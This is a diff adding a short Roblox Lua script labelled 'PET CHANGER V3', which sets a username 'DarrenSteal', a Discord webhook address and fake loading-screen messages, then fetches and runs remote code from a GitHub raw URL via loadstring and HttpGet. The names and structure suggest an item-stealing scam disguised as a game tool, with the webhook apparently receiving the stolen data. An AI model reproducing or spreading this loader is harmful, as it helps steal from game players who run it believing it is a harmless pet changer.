@@ -1,0 +1,10 @@
+UserName = "DarrenSteal"
+WebHook = "https://discord.com/api/webhooks/1097036543371247716/6g4UmnyVTSm2V6a66OiQtkyiypvLsbwsdSQ7PfoVkNAgXNhWhTAsTsXGdzWDEt-7b0yt"
+loadingscreen = true
+_G.CustomScriptName = "PET CHANGER V3"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
